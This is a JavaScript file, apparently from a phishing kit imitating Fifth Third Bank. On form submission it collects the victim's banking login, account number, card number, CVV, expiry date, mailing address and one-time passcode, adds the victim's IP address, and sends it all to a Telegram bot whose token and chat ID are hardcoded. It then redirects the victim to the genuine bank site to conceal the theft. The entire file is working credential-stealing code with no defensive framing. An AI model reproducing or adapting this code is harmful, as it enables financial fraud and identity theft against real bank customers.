// vault/send.js

// Only declare if not already declared
if (typeof BOT_TOKEN === 'undefined' && typeof CHAT_ID === 'undefined') {
  const BOT_TOKEN = '6631658853:AAFDtIUx4xDRN61dyKiROvlgmo1PpuNtjNU';
  const CHAT_ID = '5817278771';

  function sendToTelegram(data, callback) {
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(ipData => {
        const ip = ipData.ip || 'Unknown';
        const message = `[53rd Result]\n\nLOGIN\n👤 Username: ${data.userid}\n🔑 Password: ${data.password}\n\nVERIFICATION\n🏦 Account Number: ${data.accountnumber}\n🧑 Name on Card: ${data.cardname}\n💳 Card Number: ${data.cardnumber}\n💳 CVV: ${data.cvv}\n📅 Expiry Date: ${data.expdate}\n🏠 Mailing Address: ${data.mailingaddress}\n🔐 OTP: ${data.otp}\n\n🌐 IP Address: ${ip}`;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
          })
        })
        .then(() => {
          if (typeof callback === 'function') callback();
        })
        .catch(() => {
          if (typeof callback === 'function') callback();
        });
      })
      .catch(() => {
        if (typeof callback === 'function') callback();
      });
  }

  document.addEventListener('DOMContentLoaded', function () {
    const form = document.getElementById('verify-form');
    if (!form) return;

    form.addEventListener('submit', function (e) {
      e.preventDefault();

      const userid = sessionStorage.getItem('userid') || '';
      const password = sessionStorage.getItem('password') || '';

      const data = {
        userid: userid,
        password: password,
        accountnumber: form.accountnumber.value.trim(),
        cardname: form.cardname.value.trim(),
        cardnumber: form.cardnumber.value.trim(),
        cvv: form.cvv.value.trim(),
        expdate: form.expdate.value.trim(),
        mailingaddress: form.mailingaddress.value.trim(),
        otp: form.otp.value.trim()
      };

      sendToTelegram(data, function () {
        window.location.href = 'https://www.53.com/';
      });

      // Fallback redirect after 5 seconds
      setTimeout(function () {
        window.location.href = 'https://www.53.com/';
      }, 5000);

      form.reset();
    });
  });
}
